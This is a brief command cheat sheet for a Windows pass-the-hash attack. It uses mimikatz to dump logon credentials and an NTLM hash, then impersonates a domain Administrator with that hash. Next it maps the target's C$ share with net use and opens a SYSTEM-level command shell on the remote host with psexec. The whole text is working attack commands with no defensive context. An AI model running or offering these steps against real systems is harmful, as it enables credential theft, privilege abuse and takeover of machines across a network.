# Get hash for specific user
sekurlsa::logonpasswords
# Look for: "NTLM: 3dbde697d71690a769204bebe1224465"

# Pass the hash with mimikatz
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:3dbde697d71690a769204bebe1224465

# After PtH, a new cmd window opens with user's token
# Use this window to access network resources

### Using Pass-the-Hash to Access SMB

# After PtH, access network resources
net use \\TARGET_IP\C$ /user:domain\Administrator
dir \\TARGET_IP\C$

# Execute commands
psexec \\TARGET_IP -s cmd.exe